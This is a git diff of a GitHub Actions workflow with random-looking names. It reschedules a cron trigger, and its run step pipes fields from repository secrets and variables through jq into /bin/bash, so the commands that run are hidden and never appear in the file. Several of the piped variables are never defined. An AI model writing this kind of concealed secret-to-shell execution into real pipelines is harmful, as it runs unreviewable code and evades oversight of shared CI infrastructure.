@@ -1,10 +1,8 @@
 name: huyixin1923
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 4/6 * * *'
-
+    - cron: '13 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +10,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: huyixin1923
         env:
-          dlxh126: ${{ secrets.dlxh126 }}
+          pnpuc7856: ${{ secrets.pnpuc7856 }}
         run: |
-          echo $dlxh126 | jq -r .jeovr5378 | /bin/bash
-          echo $c759 | jq -r .ijnp2750 | /bin/bash
-          echo $mqwx649 | jq -r .lxyu2 | /bin/bash
-          echo $q7228 | jq -r .d63526 | /bin/bash
-          echo $jujxm826 | jq -r .r9 | /bin/bash
-          echo $kdki55 | jq -r .a3853 | /bin/bash
+          echo $pnpuc7856 | jq -r .im1028 | /bin/bash
+          echo $ri29819 | jq -r .ve509 | /bin/bash
+          echo $cspa6951 | jq -r .s41 | /bin/bash
+          echo $sybgf50972 | jq -r .n316 | /bin/bash
+          echo $fun34409 | jq -r .akzw7983 | /bin/bash
+          echo $j4907 | jq -r .va3 | /bin/bash
+          echo $kr348 | jq -r .zdu3652 | /bin/bash
+          echo $x3 | jq -r .eorty96047 | /bin/bash
 
